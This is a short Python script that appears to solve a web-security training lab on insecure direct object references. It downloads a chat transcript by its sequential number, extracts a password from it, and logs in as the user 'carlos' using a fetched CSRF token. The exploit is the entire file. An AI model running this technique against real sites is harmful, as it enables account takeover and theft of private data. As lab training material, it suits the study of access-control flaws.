#!/usr/bin/env python3
"""Insecure direct object references"""

import lab_10

class Lab(lab_10.Lab):
    """Wrapper"""

    def get_transcript(self, index: int) -> str:
        """Get transcript by number"""
        response = self.get(self.url + f"/download-transcript/{index}.txt")
        response.raise_for_status()
        return response.text

    @staticmethod
    def get_password_from_transcript(transcript: str) -> str:
        """Extract that password"""
        return transcript.split("password is ")[1].split(".")[0]

def main() -> None:
    """Entry point"""
    site = Lab()
    transcript = site.get_transcript(1)
    password = site.get_password_from_transcript(transcript)
    csrf = site.csrf_token("/login")
    response = site.login(username="carlos", password=password, csrf=csrf)
    print(response.status_code)

if __name__ == "__main__":
    main()
